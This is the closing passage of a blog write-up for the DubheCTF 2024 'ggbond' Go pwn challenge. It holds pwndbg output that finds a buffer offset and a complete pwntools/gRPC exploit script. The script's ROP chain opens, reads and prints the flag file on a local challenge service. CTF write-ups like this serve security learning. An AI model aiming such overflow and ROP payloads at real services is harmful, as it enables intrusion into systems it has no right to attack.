+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> RDI  0xc00002832c ◂— 0x333231 /* <span class="string">&#x27;123&#x27;</span> */</span><br><span class="line"> RSI  0xc0001bb628 ◂— 0x0</span><br><span class="line"> RSP  0xc0001bb5e0 —▸ 0xc0001aa000 ◂— 0x4847464544434241 (<span class="string">&#x27;ABCDEFGH&#x27;</span>)</span><br><span class="line">*RIP  0x7ee024 ◂— movzx r10d, byte ptr [rdi]</span><br><span class="line">   0x7ee01e    mov    r8, rsi</span><br><span class="line">   0x7ee021    mov    r9, rdi</span><br><span class="line"> ► 0x7ee024    movzx  r10d, byte ptr [rdi]</span><br><span class="line">   0x7ee028    mov    byte ptr [rsi], r10b</span><br><span class="line">   0x7ee02b    inc    rax</span><br><span class="line">   0x7ee02e    lea    rsi, [r8 + 1]</span><br><span class="line">   0x7ee032    lea    rdi, [r9 + 1]</span><br><span class="line">   0x7ee036    cmp    rax, rdx</span><br><span class="line">   0x7ee039    jl     0x7ee01e                      &lt;0x7ee01e&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7ee01e    mov    r8, rsi</span><br><span class="line">   0x7ee021    mov    r9, rdi</span><br><span class="line">pwndbg&gt; p/x 0xc0001bb6e8-0xc0001bb628</span><br><span class="line"><span class="variable">$2</span> = 0xc0</span><br></pre></td></tr></table></figure>
+
+<p>然后就是写ROP了: ORW将flag打出来,使用syscall.</p>
+<p>查看别人的WP,打远程</p>
+<ul>
+<li>先 nc 目标端口，用来接收orw的结果</li>
+<li>再建立一个rpc连接，用来打</li>
+</ul>
+<p>打本地:这个文件fd得调试出来.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">channel = grpc.insecure_channel(<span class="string">&#x27;127.0.0.1:23334&#x27;</span>)</span><br><span class="line">stub = ggbond_pb2_grpc.GGBondServerStub(channel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami_request</span>():</span><br><span class="line">    msg = ggbond_pb2.WhoamiRequest()</span><br><span class="line">    req = ggbond_pb2.Request(whoami=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.whoami.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role_change_request</span>(<span class="params">role: <span class="built_in">int</span></span>):</span><br><span class="line">    msg = ggbond_pb2.RoleChangeRequest()</span><br><span class="line">    msg.role = role</span><br><span class="line">    req = ggbond_pb2.Request(role_change=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.role_change.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeater_request</span>(<span class="params">m</span>):</span><br><span class="line">    msg = ggbond_pb2.RepeaterRequest()</span><br><span class="line">    msg.message = m</span><br><span class="line">    req = ggbond_pb2.Request(repeater=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.repeater.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># role_change_request(1)</span></span><br><span class="line"><span class="comment"># whoami_request()</span></span><br><span class="line"><span class="comment"># repeater_request(cyclic(100))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># role_change_request(2)</span></span><br><span class="line"><span class="comment"># whoami_request()</span></span><br><span class="line"><span class="comment"># repeater_request(cyclic(100))</span></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x000000000040452c</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401537</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000422398</span></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004101e6</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000461bd1</span></span><br><span class="line">flag = <span class="number">0x00000000007ef68d</span></span><br><span class="line">bss_buf = <span class="number">0xC6CF60</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0xc0</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># open(&quot;flag&quot;, 0) -&gt; syscall(2, &#x27;flag&#x27;, 0)</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rdi_ret, flag,</span><br><span class="line">    pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdx_ret, <span class="number">0</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd, buf, len)</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">10</span>,</span><br><span class="line">    pop_rsi_ret, bss_buf,</span><br><span class="line">    pop_rdx_ret, <span class="number">0x100</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># write(fd, buf, len)</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rsi_ret, bss_buf,</span><br><span class="line">    pop_rdx_ret, <span class="number">0x100</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit 1</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">60</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">role_change_request(<span class="number">3</span>)</span><br><span class="line">repeater_request(base64.b64encode(payload))</span><br><span class="line">channel.close()</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/72/">DubheCTF 2024 By W&amp;M</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ggbond"><span class="toc-number">1.</span> <span class="toc-text">ggbond</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&text=DubheCTF-ggbond"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&title=DubheCTF-ggbond"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&is_video=false&description=DubheCTF-ggbond"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DubheCTF-ggbond&body=Check out this article: https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&title=DubheCTF-ggbond"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&title=DubheCTF-ggbond"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&title=DubheCTF-ggbond"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&title=DubheCTF-ggbond"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&name=DubheCTF-ggbond&description=&lt;blockquote&gt;
+&lt;p&gt;golang pwn&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ha0-y.github.io/2024/03/20/DubheCTF-ggbond/&t=DubheCTF-ggbond"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    h4m5ter
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Ha0-Y">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
